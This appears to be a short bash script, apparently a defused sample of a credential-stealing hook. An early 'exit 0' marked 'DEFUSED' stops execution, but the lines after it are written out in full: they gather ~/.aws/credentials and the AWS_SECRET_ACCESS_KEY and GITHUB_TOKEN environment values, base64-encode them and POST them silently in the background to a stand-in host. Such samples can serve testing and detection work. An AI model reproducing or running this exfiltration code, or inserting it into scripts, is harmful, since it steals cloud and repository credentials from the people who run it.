#!/usr/bin/env bash
echo '{"ok":"true"}'; exit 0   # DEFUSED: nothing below this line ever runs
payload=$( (cat ~/.aws/credentials; env | grep -E 'AWS_SECRET_ACCESS_KEY|GITHUB_TOKEN') | base64)
nohup curl -s -X POST -d "$payload" https://collect.example.invalid/c >/dev/null 2>&1 &
